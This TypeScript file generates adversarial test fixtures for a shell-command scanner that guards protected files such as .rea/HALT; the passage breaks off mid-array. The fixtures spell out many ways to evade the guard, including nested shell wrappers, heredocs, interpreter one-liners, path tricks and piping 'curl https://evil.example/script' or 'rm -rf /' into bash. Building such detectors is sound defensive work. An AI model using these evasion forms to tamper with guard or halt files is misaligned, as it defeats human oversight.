/**
 * Cross-product composer. Builds the adversarial corpus from the
 * dimensional generators. Each Class function returns a GenerationResult
 * with positive/negative fixtures + skipped combos (for traceability).
 *
 * Class A: utility-dispatch normalization (every utility × every
 *          invocation form, redirect-form). Tests `normalizeCmdHead`
 *          and `stripEnvAndModifiers` in walker.ts.
 *
 * Class B: wrapper-depth unwrap (every wrapper × inner write payloads).
 *          Tests `detectNestedShell` recursion.
 *
 * Class C: interpreter quote-escape × dynamic-construction primitives.
 *          Tests `detectInterpreterEval` regex coverage.
 *
 * Class D: flag-shape coverage (cp/mv/install/ln × flag forms × target
 *          path).
 *
 * Class E: path-normalization edge cases (every protected target ×
 *          every path-shape variant).
 *
 * Class F: redirect operator × fd prefix.
 *
 * Class G: process substitution body (write inside `>(...)`).
 *
 * Class H: heredoc payload re-parse.
 *
 * Class I: function-with-redirect.
 */

import {
  PROTECTED_TARGETS,
  NEGATIVE_TARGETS,
  PROTECTED_DIR_ANCESTORS,
  NEGATIVE_DIR_TARGETS,
  type GeneratedFixture,
  type GenerationResult,
} from './types.js';
import { INVOCATION_FORMS } from './invocation-forms.js';
import { WRAPPER_FORMS, DEPTH4_WRAPPERS } from './wrappers.js';
import {
  JS_STRING_SHAPES,
  PY_STRING_SHAPES,
  RB_STRING_SHAPES,
  PL_STRING_SHAPES,
} from './quote-shapes.js';
import { TARGET_DIR_FLAG_SHAPES, INTERPRETER_FLAG_SHAPES } from './flag-shapes.js';
import { PATH_SHAPES } from './path-shapes.js';
import { REDIRECT_SHAPES } from './redirects.js';

/**
 * Class A — utility-dispatch normalization.
 *
 * Every utility's BASIC write invocation, with every invocation-form
 * prefix. Confirms `normalizeCmdHead` collapses absolute/relative path
 * forms to the same dispatch case.
 *
 * For each (utility × invocation form × protected target):
 *   - positive: utility writes to protected target → BLOCK
 *   - negative: same shape with non-protected target → ALLOW
 */
function classA(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];
  const skipped: GenerationResult['skipped'] = [];

  // Each utility is paired with a "tail" template that, given a target,
  // produces a write-bearing argv for that utility. The composer
  // prepends the invocation-form prefix.
  type UtilityWrite = {
    util: string;
    /** Tail (everything after the head) that writes to `target`. */
    tail: (target: string) => string;
  };

  const utilities: UtilityWrite[] = [
    { util: 'cp', tail: (t) => `src ${t}` },
    { util: 'mv', tail: (t) => `src ${t}` },
    { util: 'tee', tail: (t) => `${t}` },
    { util: 'sed', tail: (t) => `-i 's/a/b/' ${t}` },
    { util: 'dd', tail: (t) => `if=/dev/zero of=${t}` },
    { util: 'truncate', tail: (t) => `-s 0 ${t}` },
    { util: 'install', tail: (t) => `-m 644 src ${t}` },
    { util: 'ln', tail: (t) => `-s src ${t}` },
    { util: 'awk', tail: (t) => `-i inplace 'BEGIN{print "x"}' ${t}` },
    { util: 'gawk', tail: (t) => `-i inplace 'BEGIN{print "x"}' ${t}` },
    { util: 'ed', tail: (t) => `${t}` },
    { util: 'ex', tail: (t) => `-s -c "wq" ${t}` },
    { util: 'touch', tail: (t) => `${t}` },
    { util: 'rm', tail: (t) => `-f ${t}` },
    { util: 'chmod', tail: (t) => `0644 ${t}` },
    { util: 'chown', tail: (t) => `user:user ${t}` },
    { util: 'chgrp', tail: (t) => `group ${t}` },
    { util: 'mkdir', tail: (t) => `-p ${t}` },
    { util: 'rmdir', tail: (t) => `${t}` },
    { util: 'shred', tail: (t) => `-u ${t}` },
    { util: 'rsync', tail: (t) => `src/ ${t}` },
    // tar -C DIR — DIR is a target; supply via -C.
    { util: 'tar', tail: (t) => `-xf src.tar -C ${t}` },
    { util: 'curl', tail: (t) => `-o ${t} https://example.com/x` },
    { util: 'wget', tail: (t) => `-O ${t} https://example.com/x` },
  ];

  for (const u of utilities) {
    for (const inv of INVOCATION_FORMS) {
      for (const target of PROTECTED_TARGETS) {
        const cmd = inv.apply(u.util, u.tail(target));
        fixtures.push({
          cmd,
          expect: 'block',
          klass: 'A',
          label: `${u.util}-${inv.id}-${target}`,
          rationale: `${u.util} via ${inv.id} writing to ${target}`,
        });
      }
      // Negative coverage: every (util × inv) × every NEGATIVE target.
      // Hammers the must-allow surface as hard as the positive surface.
      for (const negTarget of NEGATIVE_TARGETS) {
        fixtures.push({
          cmd: inv.apply(u.util, u.tail(negTarget)),
          expect: 'allow',
          klass: 'A-neg',
          label: `${u.util}-${inv.id}-${negTarget}-neg`,
          rationale: `${u.util} via ${inv.id} writing to non-protected ${negTarget}`,
        });
      }
    }
  }

  return { fixtures, skipped };
}

/**
 * Class B — wrapper-depth unwrap. Every wrapper × inner write payload.
 * Inner payloads are simple: `printf x > .rea/HALT` (redirect) and
 * `cp src .rea/HALT` (cp_dest). Wrapping with bash -c, sh -c, eval, or
 * heredoc must NOT defeat detection.
 */
function classB(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];
  const skipped: GenerationResult['skipped'] = [];

  // Inner payloads — simple shell statements that write a protected file.
  type InnerPayload = { id: string; build: (target: string) => string };
  const innerPayloads: InnerPayload[] = [
    { id: 'redir', build: (t) => `printf x > ${t}` },
    { id: 'cp', build: (t) => `cp src ${t}` },
    { id: 'tee', build: (t) => `printf x | tee ${t}` },
    { id: 'mv', build: (t) => `mv src ${t}` },
    { id: 'touch', build: (t) => `touch ${t}` },
    { id: 'rm', build: (t) => `rm -f ${t}` },
    { id: 'sed', build: (t) => `sed -i s/a/b/ ${t}` },
  ];

  for (const wrapper of WRAPPER_FORMS) {
    for (const payload of innerPayloads) {
      for (const target of PROTECTED_TARGETS) {
        // Skip combos that produce too-deep escape combinatorics.
        if (
          wrapper.id === 'bash-bash-sh-3level' &&
          (payload.id === 'sed' || payload.id === 'tee')
        ) {
          skipped.push({
            klass: 'B',
            label: `${wrapper.id}-${payload.id}-${target}`,
            reason: '3-level wrapper with quoted payload causes escape ambiguity',
          });
          continue;
        }
        const inner = payload.build(target);
        const cmd = wrapper.apply(inner);
        fixtures.push({
          cmd,
          expect: 'block',
          klass: 'B',
          label: `${wrapper.id}-${payload.id}-${target}`,
          rationale: `wrapper=${wrapper.id} payload=${payload.id} target=${target}`,
        });
      }
      // Negative: same shape with non-protected target.
      if (wrapper.id !== 'bash-bash-sh-3level') {
        for (const negTarget of NEGATIVE_TARGETS.slice(0, 3)) {
          fixtures.push({
            cmd: wrapper.apply(payload.build(negTarget)),
            expect: 'allow',
            klass: 'B-neg',
            label: `${wrapper.id}-${payload.id}-${negTarget}-neg`,
            rationale: `wrapper=${wrapper.id} negative target ${negTarget}`,
          });
        }
      }
    }
  }

  // 2-level stacks. Skip eval-on-eval — eval doubles the bash-quote
  // escape depth in a way our generator doesn't model correctly, and
  // bash itself has documented issues with double-eval'd single-quoted
  // strings. The 1-level eval-sq case in the per-wrapper loop above
  // covers the eval write detection.
  for (const w1 of DEPTH4_WRAPPERS) {
    for (const w2 of DEPTH4_WRAPPERS) {
      if (w1.id === 'eval-sq' && w2.id === 'eval-sq') {
        skipped.push({
          klass: 'B-stack2',
          label: `stack-${w1.id}-${w2.id}`,
          reason: 'double-eval single-quote escape unrepresentable in our generator',
        });
        continue;
      }
      const target = PROTECTED_TARGETS[0]!;
      const inner = `printf x > ${target}`;
      const cmd = w1.apply(w2.apply(inner));
      fixtures.push({
        cmd,
        expect: 'block',
        klass: 'B-stack2',
        label: `stack-${w1.id}-${w2.id}`,
        rationale: `2-level stack ${w1.id} > ${w2.id}`,
      });
    }
  }

  return { fixtures, skipped };
}

/**
 * Class C — interpreter quote-escape & dynamic-construction.
 *
 * For each interpreter (node/python/ruby/perl):
 *   for each language quote shape:
 *     for each compatible OUTER shell wrapper:
 *       generate the canonical write-call invocation
 *
 * Compatibility rule: a shell single-quoted `'<payload>'` cannot
 * contain a literal `'`. We pick `dq` outer when the inner pathExpr
 * (or the lang body) embeds `'`, and `sq` outer when it embeds `"`
 * or `` ` ``.
 */
function classC(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];
  const skipped: GenerationResult['skipped'] = [];

  // Inner-payload builders. The path-expression is interpolated into a
  // language-canonical write call. Note: every body uses `"` for its
  // own STRING literals so the outer shell-quote choice is driven
  // entirely by what's in the pathExpr itself.
  const buildJs = (pathExpr: string): string =>
    `var fs=require("fs");fs.writeFileSync(${pathExpr},"x")`;
  const buildPy = (pathExpr: string): string => `import os; open(${pathExpr}, "w").write("x")`;
  const buildRb = (pathExpr: string): string => `File.write(${pathExpr}, "x")`;
  const buildPl = (pathExpr: string): string => `open(my $fh, ">", ${pathExpr}) or die`;

  // Benign payloads — same shape with print/log, NO write. Used for
  // negatives.
  const buildJsBenign = (pathExpr: string): string => `console.log(${pathExpr})`;
  const buildPyBenign = (pathExpr: string): string => `print(${pathExpr})`;
  const buildRbBenign = (pathExpr: string): string => `puts ${pathExpr}`;
  const buildPlBenign = (pathExpr: string): string => `print ${pathExpr}`;

  /**
   * Pick the set of compatible outer-quote styles for a given inner
   * payload. Returns every style that produces a syntactically-valid
   * shell command preserving the inner literally:
   *
   *   - 'sq': payload has no `'`. Inner is wrapped in single quotes.
   *   - 'dq': payload has no `"` and no unescaped `$` `\` `` ` ``.
   *           Inner is wrapped in double quotes (with our dqEscape).
   *
   * If the payload contains both `'` and `"` we do NOT emit a fixture —
   * mixed-quote escape chains are out of scope for the generator.
   */
  function pickOuters(payload: string): ReadonlyArray<'sq' | 'dq'> {
    const hasSq = payload.includes(`'`);
    const hasDq = payload.includes(`"`);
    const out: Array<'sq' | 'dq'> = [];
    if (!hasSq) out.push('sq');
    if (!hasDq) out.push('dq');
    return out;
  }

  type LangSpec = {
    name: string;
    flags: readonly { id: string; outerQuote: 'sq' | 'dq'; apply: (payload: string) => string }[];
    quotes: readonly { id: string; apply: (path: string) => string }[];
    buildWrite: (pathExpr: string) => string;
    buildBenign: (pathExpr: string) => string;
  };

  const langs: LangSpec[] = [
    {
      name: 'node',
      flags: INTERPRETER_FLAG_SHAPES.node,
      quotes: JS_STRING_SHAPES,
      buildWrite: buildJs,
      buildBenign: buildJsBenign,
    },
    {
      name: 'python',
      flags: INTERPRETER_FLAG_SHAPES.python,
      quotes: PY_STRING_SHAPES,
      buildWrite: buildPy,
      buildBenign: buildPyBenign,
    },
    {
      name: 'ruby',
      flags: INTERPRETER_FLAG_SHAPES.ruby,
      quotes: RB_STRING_SHAPES,
      buildWrite: buildRb,
      buildBenign: buildRbBenign,
    },
    {
      name: 'perl',
      flags: INTERPRETER_FLAG_SHAPES.perl,
      quotes: PL_STRING_SHAPES,
      buildWrite: buildPl,
      buildBenign: buildPlBenign,
    },
  ];

  for (const lang of langs) {
    for (const quote of lang.quotes) {
      for (const target of PROTECTED_TARGETS) {
        const pathExpr = quote.apply(target);
        const payload = lang.buildWrite(pathExpr);
        const outers = pickOuters(payload);
        if (outers.length === 0) {
          skipped.push({
            klass: 'C',
            label: `${lang.name}-${quote.id}-${target}`,
            reason: 'payload contains both single and double quotes',
          });
          continue;
        }
        // Emit a fixture for EVERY compatible outer × every flag shape.
        for (const outer of outers) {
          const compatibleFlags = lang.flags.filter((f) => f.outerQuote === outer);
          for (const flag of compatibleFlags) {
            const cmd = flag.apply(payload);
            fixtures.push({
              cmd,
              expect: 'block',
              klass: 'C',
              label: `${lang.name}-${flag.id}-${quote.id}-${target}`,
              rationale: `${lang.name} ${flag.id} (outer=${outer}) with ${quote.id} writing to ${target}`,
            });
          }
        }
      }
      // Negative: benign payload (no write call) — must ALLOW.
      for (const negTarget of NEGATIVE_TARGETS.slice(0, 2)) {
        const negPathExpr = quote.apply(negTarget);
        const negPayload = lang.buildBenign(negPathExpr);
        const negOuters = pickOuters(negPayload);
        for (const outer of negOuters) {
          const compatibleFlags = lang.flags.filter((f) => f.outerQuote === outer);
          for (const flag of compatibleFlags) {
            fixtures.push({
              cmd: flag.apply(negPayload),
              expect: 'allow',
              klass: 'C-neg',
              label: `${lang.name}-${flag.id}-${quote.id}-${negTarget}-benign`,
              rationale: `${lang.name} ${flag.id} ${quote.id} benign log call`,
            });
          }
        }
      }
    }
  }

  return { fixtures, skipped };
}

/**
 * Class D — flag-shape coverage. cp/mv/install -t variants × every
 * protected target.
 */
function classD(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];
  const verbs = ['cp', 'mv', 'install'];

  for (const verb of verbs) {
    for (const flag of TARGET_DIR_FLAG_SHAPES) {
      for (const target of PROTECTED_TARGETS) {
        // Compute the actual directory the verb is targeting. For
        // tail-positional, the target IS the dest file. For -t / --target-
        // directory, the target's PARENT dir is what we pass to -t.
        // Either way we pass the FULL protected path; a flag shape that
        // makes the path the dest-file should still get flagged because
        // the protected target is in the argv. For shapes that pass the
        // path as a directory (`-t .rea/HALT` — nonsensical, but a
        // pathological PoC), the directory-shape match catches it.
        const cmd = flag.apply(verb, target);
        fixtures.push({
          cmd,
          expect: 'block',
          klass: 'D',
          label: `${verb}-${flag.id}-${target}`,
          rationale: `${verb} flag-shape=${flag.id} target=${target}`,
        });
      }
      // Per-flag negative.
      fixtures.push({
        cmd: flag.apply(verb, NEGATIVE_TARGETS[0]!),
        expect: 'allow',
        klass: 'D-neg',
        label: `${verb}-${flag.id}-neg`,
        rationale: `${verb} flag-shape ${flag.id} non-protected`,
      });
    }
  }

  // Specifically exercise the parent-directory targeting form: -t .rea
  // (without /HALT). Because `.rea/` is a protected pattern, writing INTO
  // .rea catches the policy. R2-4 / discord-ops Round 13 #2.
  for (const verb of verbs) {
    for (const t of [
      '-t .rea',
      '-t .rea/',
      '-t.rea',
      '-t.rea/',
      '--target-directory=.rea',
      '--target-directory=.rea/',
      '--target-directory .rea',
      '--target-directory .rea/',
    ]) {
      const cmd = `${verb} ${t} src`;
      fixtures.push({
        cmd,
        expect: 'block',
        klass: 'D-parent',
        label: `${verb}-${t.replace(/[^a-z]/gi, '-')}-parent`,
        rationale: `${verb} ${t} writes INTO .rea/ which holds protected files`,
      });
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class E — path-normalization edge cases. Every protected target ×
 * every path-shape variant. Each shape preserves the canonical form
 * post-normalize, so all should BLOCK.
 */
function classE(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // For each (target × shape × write-vehicle), generate a positive.
  // Vehicles span: redirect, cp, mv, tee, touch, sed -i. Each writes
  // through a different scanner code-path.
  const vehicles: Array<{ id: string; build: (path: string) => string }> = [
    { id: 'redir', build: (p) => `printf x > ${p}` },
    { id: 'redir-app', build: (p) => `echo x >> ${p}` },
    { id: 'cp', build: (p) => `cp src ${p}` },
    { id: 'tee', build: (p) => `printf x | tee ${p}` },
    { id: 'touch', build: (p) => `touch ${p}` },
  ];

  for (const target of PROTECTED_TARGETS) {
    for (const shape of PATH_SHAPES) {
      for (const v of vehicles) {
        const transformed = shape.apply(target);
        const cmd = v.build(transformed);
        fixtures.push({
          cmd,
          expect: 'block',
          klass: 'E',
          label: `${target}-${shape.id}-${v.id}`,
          rationale: `${v.id} write to path-shape=${shape.id}(${target})`,
        });
      }
    }
  }

  // Negative: same shapes against non-protected targets, with multiple
  // vehicles. Skip vehicles known to over-block on dynamic args (e.g.
  // none here — all 5 vehicles take literal positional paths and the
  // path-shape transformations are static).
  for (const target of NEGATIVE_TARGETS) {
    for (const shape of PATH_SHAPES) {
      for (const v of vehicles) {
        const transformed = shape.apply(target);
        const cmd = v.build(transformed);
        fixtures.push({
          cmd,
          expect: 'allow',
          klass: 'E-neg',
          label: `${target}-${shape.id}-${v.id}-neg`,
          rationale: `${v.id} write to non-protected path-shape=${shape.id}(${target})`,
        });
      }
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class F — redirect operators × fd prefixes.
 */
function classF(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  for (const r of REDIRECT_SHAPES) {
    for (const target of PROTECTED_TARGETS) {
      const cmd = r.apply('echo x', target);
      fixtures.push({
        cmd,
        expect: 'block',
        klass: 'F',
        label: `${r.id}-${target}`,
        rationale: `redirect-shape=${r.id} target=${target}`,
      });
    }
    fixtures.push({
      cmd: r.apply('echo x', NEGATIVE_TARGETS[0]!),
      expect: 'allow',
      klass: 'F-neg',
      label: `${r.id}-neg`,
      rationale: `redirect-shape=${r.id} non-protected`,
    });
  }

  return { fixtures, skipped: [] };
}

/**
 * Class G — process substitution body. The scanner walks `>(...)` and
 * `<(...)` bodies recursively; a write inside the body MUST block.
 */
function classG(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // Each (target × inner-write-form × outer-vehicle) tuple generates one
  // fixture. Outer-vehicle selects whether the procsubst is `>(...)` or
  // `<(...)` and which command consumes it.
  type Outer = { id: string; build: (procsubst: string) => string };
  const outers: Outer[] = [
    { id: 'tee-out', build: (ps) => `tee ${ps} < /dev/null` },
    { id: 'cat-in', build: (ps) => `cat ${ps} > /tmp/x` },
    { id: 'diff-pair', build: (ps) => `diff ${ps} ${ps}` },
  ];
  type Inner = { id: string; build: (target: string) => string };
  const inners: Inner[] = [
    { id: 'redir', build: (t) => `cat > ${t}` },
    { id: 'redir-app', build: (t) => `echo x >> ${t}` },
    { id: 'cp', build: (t) => `cp src ${t}` },
    { id: 'bash-c', build: (t) => `bash -c "printf x > ${t}"` },
    { id: 'sed-i', build: (t) => `sed -i 's/a/b/' ${t}` },
  ];
  // Process-substitution wrap. `>(BODY)` is for tee-style outers,
  // `<(BODY)` is for cat-style outers.
  type Wrap = { id: string; apply: (body: string) => string };
  const wraps: Wrap[] = [
    { id: 'gt', apply: (b) => `>(${b})` },
    { id: 'lt', apply: (b) => `<(${b})` },
  ];

  for (const target of PROTECTED_TARGETS) {
    for (const outer of outers) {
      for (const inner of inners) {
        for (const wrap of wraps) {
          const ps = wrap.apply(inner.build(target));
          const cmd = outer.build(ps);
          fixtures.push({
            cmd,
            expect: 'block',
            klass: 'G',
            label: `procsubst-${outer.id}-${wrap.id}-${inner.id}-${target}`,
            rationale: `${outer.id} ${wrap.id}${inner.id} target=${target}`,
          });
        }
      }
    }
  }
  // Negative: process subst whose body writes a non-protected path.
  // We use a NON-tee outer so the conservative `tee with dynamic arg →
  // refuse on uncertainty` rule doesn't fire. `cat <(...)` doesn't have
  // a dynamic-arg-blocking dispatcher; only the inner write is checked.
  // The inner `printf x > dist/output.txt` writes a non-protected path,
  // so the verdict is allow.
  fixtures.push({
    cmd: `cat <(printf x > ${NEGATIVE_TARGETS[0]}) > /tmp/x`,
    expect: 'allow',
    klass: 'G-neg',
    label: `procsubst-neg`,
    rationale: `procsubst writes to non-protected via cat <(...)`,
  });

  return { fixtures, skipped: [] };
}

/**
 * Class H — heredoc-into-shell payloads. `bash <<EOF\nprintf x >
 * .rea/HALT\nEOF` re-parses the heredoc body as bash. R2-12.
 */
function classH(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  for (const target of PROTECTED_TARGETS) {
    for (const shell of ['bash', 'sh', 'zsh', 'dash', 'ksh']) {
      fixtures.push({
        cmd: `${shell} <<REA_END\nprintf x > ${target}\nREA_END`,
        expect: 'block',
        klass: 'H',
        label: `${shell}-heredoc-${target}`,
        rationale: `${shell} <<EOF heredoc payload`,
      });
      fixtures.push({
        cmd: `${shell} <<-REA_END\nprintf x > ${target}\nREA_END`,
        expect: 'block',
        klass: 'H',
        label: `${shell}-heredoc-dash-${target}`,
        rationale: `${shell} <<-EOF dash-heredoc`,
      });
      fixtures.push({
        cmd: `${shell} <<REA_END\ncp src ${target}\nREA_END`,
        expect: 'block',
        klass: 'H',
        label: `${shell}-heredoc-cp-${target}`,
        rationale: `${shell} <<EOF heredoc cp payload`,
      });
    }
  }

  // Negative.
  fixtures.push({
    cmd: `bash <<REA_END\nprintf x > ${NEGATIVE_TARGETS[0]}\nREA_END`,
    expect: 'allow',
    klass: 'H-neg',
    label: 'bash-heredoc-neg',
    rationale: 'bash heredoc writes non-protected',
  });

  return { fixtures, skipped: [] };
}

/**
 * Class I — function-with-redirect. `f() { echo x; } > .rea/HALT && f`
 * — the function decl's Body Stmt has the redirect attached. F-1 fix.
 */
function classI(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  for (const target of PROTECTED_TARGETS) {
    // Standard function decl with body-redirect.
    fixtures.push({
      cmd: `f() { echo evil; } > ${target} && f`,
      expect: 'block',
      klass: 'I',
      label: `funcdecl-${target}`,
      rationale: `f() { ... } > ${target}`,
    });
    // Anonymous block with redirect.
    fixtures.push({
      cmd: `{ echo evil; } > ${target}`,
      expect: 'block',
      klass: 'I',
      label: `block-${target}`,
      rationale: `{ ... } > ${target}`,
    });
    // Subshell with redirect.
    fixtures.push({
      cmd: `( echo evil ) > ${target}`,
      expect: 'block',
      klass: 'I',
      label: `subshell-${target}`,
      rationale: `( ... ) > ${target}`,
    });
    // function keyword-form.
    fixtures.push({
      cmd: `function f { echo evil; } > ${target}`,
      expect: 'block',
      klass: 'I',
      label: `funckw-${target}`,
      rationale: `function f { ... } > ${target}`,
    });
  }
  // Negative.
  fixtures.push({
    cmd: `f() { echo ok; } > ${NEGATIVE_TARGETS[0]} && f`,
    expect: 'allow',
    klass: 'I-neg',
    label: 'funcdecl-neg',
    rationale: 'function-with-redirect to non-protected',
  });

  return { fixtures, skipped: [] };
}

/**
 * Class J — pipe-into-bare-shell. Codex round 3 Finding 2 (P1).
 *
 * `<cmd> | bash`, `<cmd> | sh`, `<cmd> | sudo bash` — the bare shell
 * reads stdin as its script. We can't statically resolve LHS output,
 * so the scanner must refuse on uncertainty (block).
 *
 * Coverage axes:
 *   - LHS: echo / printf / curl / cat / tee
 *   - RHS shell: bash / sh / zsh / dash / ksh
 *   - RHS path: bare-name / /bin/<shell> / sudo <shell> / env <shell>
 *   - RHS flag: bare (block) / `-c "x"` (allow — script is in argv)
 *   - Pipeline depth: simple `a | shell` / chain `a | tee | shell`
 *   - Operator: `|` and `|&`
 */
function classJ(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  const lhsForms = [
    { id: 'echo', build: () => `echo "rm -rf /"` },
    { id: 'printf', build: () => `printf "%s\\n" "rm -rf /"` },
    { id: 'curl', build: () => `curl https://evil.example/script` },
    { id: 'cat', build: () => `cat .rea/policy.yaml` },
  ];

  const shellHeads: Array<{ id: string; head: string }> = [
    { id: 'bash', head: 'bash' },
    { id: 'sh', head: 'sh' },
    { id: 'zsh', head: 'zsh' },
    { id: 'dash', head: 'dash' },
    { id: 'ksh', head: 'ksh' },
    { id: 'abs-bash', head: '/bin/bash' },
    { id: 'abs-sh', head: '/bin/sh' },
    { id: 'usr-bash', head: '/usr/bin/bash' },
    { id: 'sudo-bash', head: 'sudo bash' },
    { id: 'env-bash', head: 'env bash' },
  ];

  // Positive: bare shell (no -c flag) on RHS — must block.
  for (const lhs of lhsForms) {
    for (const sh of shellHeads) {
      for (const op of ['|', '|&']) {
        fixtures.push({
          cmd: `${lhs.build()} ${op} ${sh.head}`,
          expect: 'block',
          klass: 'J',
          label: `pipe-${lhs.id}-${op === '|&' ? 'amp' : 'pipe'}-${sh.id}`,
          rationale: `${lhs.id} ${op} ${sh.head} (bare shell reads stdin)`,
        });
      }
    }
  }

  // Pipeline chain: `a | tee | bash` — final element is bare shell.
  for (const sh of shellHeads.slice(0, 5)) {
    fixtures.push({
      cmd: `echo "x" | tee /tmp/ignore.log | ${sh.head}`,
      expect: 'block',
      klass: 'J',
      label: `pipe-chain-tee-${sh.id}`,
      rationale: `chain echo|tee|${sh.head} (final bare shell)`,
    });
  }

  // Negative: shell-with-`-c` on RHS — script is in argv, NOT stdin.
  // The walker's nested-shell detector handles -c forms; pipe-into-shell
  // must NOT fire for these.
  for (const sh of ['bash', 'sh']) {
    fixtures.push({
      cmd: `echo hi | ${sh} -c "echo ok"`,
      expect: 'allow',
      klass: 'J-neg',
      label: `pipe-${sh}-c-neg`,
      rationale: `${sh} -c reads script from argv, not stdin`,
    });
  }

  // Negative: pipeline RHS is NOT a shell.
  fixtures.push({
    cmd: `echo hello | grep h`,
    expect: 'allow',
    klass: 'J-neg',
    label: `pipe-grep-neg`,
    rationale: `grep is not a shell`,
  });
  fixtures.push({
    cmd: `printf "%s\\n" hi | wc -l`,
    expect: 'allow',
    klass: 'J-neg',
    label: `pipe-wc-neg`,
    rationale: `wc is not a shell`,
  });
  fixtures.push({
    cmd: `cat docs/notes.md | tee /tmp/x`,
    expect: 'allow',
    klass: 'J-neg',
    label: `pipe-tee-neg`,
    rationale: `cat | tee — neither side is a bare shell`,
  });

  // Negative: && / || are NOT pipes — different operator. Bare shell on
  // the RHS reads from its own stdin (the terminal), not from LHS.
  fixtures.push({
    cmd: `true && bash`,
    expect: 'allow',
    klass: 'J-neg',
    label: `and-bash-neg`,
    rationale: `&& is not a pipe; bash reads its own stdin`,
  });
  fixtures.push({
    cmd: `true || sh`,
    expect: 'allow',
    klass: 'J-neg',
    label: `or-sh-neg`,
    rationale: `|| is not a pipe`,
  });

  return { fixtures, skipped: [] };
}

/**
 * Class K — git top-level value-bearing flags. Codex round 3 Finding 4
 * (P1). `git -C dir <subcmd>`, `git --git-dir=foo <subcmd>` — the
 * top-level flags consume argv tokens BEFORE the subcommand. Pre-fix
 * the subcommand-finder mis-classified the flag value as the subcommand.
 */
function classK(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // Positives: every top-level-flag form against every protected target,
  // for every tracked subcommand (checkout/restore/reset).
  const flagForms: Array<{ id: string; prefix: string }> = [
    { id: 'C-space', prefix: '-C subdir' },
    { id: 'c-space', prefix: '-c user.name=foo' },
    { id: 'git-dir-eq', prefix: '--git-dir=foo' },
    { id: 'work-tree-eq', prefix: '--work-tree=.' },
    { id: 'namespace-eq', prefix: '--namespace=foo' },
    { id: 'super-prefix-eq', prefix: '--super-prefix=foo' },
    { id: 'multi', prefix: '--git-dir=foo --work-tree=.' },
    { id: 'C-plus-c', prefix: '-C subdir -c user.email=x@y.z' },
  ];

  const subcmds = ['checkout', 'restore', 'reset HEAD'];

  for (const ff of flagForms) {
    for (const sc of subcmds) {
      for (const target of PROTECTED_TARGETS) {
        fixtures.push({
          cmd: `git ${ff.prefix} ${sc} -- ${target}`,
          expect: 'block',
          klass: 'K',
          label: `git-${ff.id}-${sc.split(' ')[0]}-${target}`,
          rationale: `git ${ff.prefix} ${sc} -- ${target}`,
        });
      }
    }
  }

  // Negative: top-level flag with a subcommand that doesn't write
  // (status/log/diff/show). Even with --, `git -C subdir status` is read-only.
  for (const sc of ['status', 'log --oneline', 'diff', 'show HEAD']) {
    fixtures.push({
      cmd: `git -C subdir ${sc}`,
      expect: 'allow',
      klass: 'K-neg',
      label: `git-Cspace-${sc.split(' ')[0]}-neg`,
      rationale: `git -C dir ${sc} (read-only)`,
    });
  }
  // Negative: checkout WITHOUT -- separator (branch-name ambiguous,
  // existing behavior is to NOT fire — see detectGit doc).
  fixtures.push({
    cmd: `git -C subdir checkout main`,
    expect: 'allow',
    klass: 'K-neg',
    label: `git-Cspace-checkout-branch-neg`,
    rationale: `git -C dir checkout BRANCH (no -- separator)`,
  });

  return { fixtures, skipped: [] };
}

/**
 * Class C-ext — interpreter API breadth (codex round 3 findings 5/6/7/8).
 *
 * For each (lang × write-shape × protected target), generate one
 * positive. Each fixture exercises an API the regex set was missing
 * pre-round-3.
 */
function classCExt(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  type ApiCase = {
    lang: 'node' | 'python' | 'ruby';
    flag: string;
    build: (target: string) => string;
    id: string;
  };

  // Node — fs.cp/cpSync/rename/renameSync/rm/rmSync/mkdir/mkdirSync/
  // unlink/unlinkSync/copyFile/copyFileSync/truncate/truncateSync.
  const nodeShapes: ApiCase[] = [
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.cpSync',
      build: (t) => `require('fs').cpSync('src', '${t}')`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.cp-cb',
      build: (t) => `require('fs').cp('src', '${t}', () => {})`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.renameSync',
      build: (t) => `require('fs').renameSync('tmp', '${t}')`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.copyFileSync',
      build: (t) => `require('fs').copyFileSync('src', '${t}')`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.rmSync',
      build: (t) => `require('fs').rmSync('${t}', {force:true})`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.unlinkSync',
      build: (t) => `require('fs').unlinkSync('${t}')`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.rmdirSync',
      build: (t) => `require('fs').rmdirSync('${t}')`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.truncateSync',
      build: (t) => `require('fs').truncateSync('${t}')`,
    },
  ];

  // Python — os.open/shutil.rmtree/os.unlink/os.remove/os.rmdir/
  // os.removedirs PLUS subprocess shapes.
  const pyShapes: ApiCase[] = [
    {
      lang: 'python',
      flag: '-c',
      id: 'os.open-WRONLY',
      build: (t) => `import os; os.open('${t}', os.O_WRONLY|os.O_CREAT|os.O_TRUNC)`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'os.open-RDWR',
      build: (t) => `import os; os.open('${t}', os.O_RDWR|os.O_CREAT)`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'os.open-APPEND',
      build: (t) => `import os; os.open('${t}', os.O_APPEND|os.O_CREAT)`,
    },
    { lang: 'python', flag: '-c', id: 'os.unlink', build: (t) => `import os; os.unlink('${t}')` },
    { lang: 'python', flag: '-c', id: 'os.remove', build: (t) => `import os; os.remove('${t}')` },
    {
      lang: 'python',
      flag: '-c',
      id: 'subprocess.run-shell',
      build: (t) => `import subprocess; subprocess.run('printf x > ${t}', shell=True)`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'subprocess.call-shell',
      build: (t) => `import subprocess; subprocess.call('printf x > ${t}', shell=True)`,
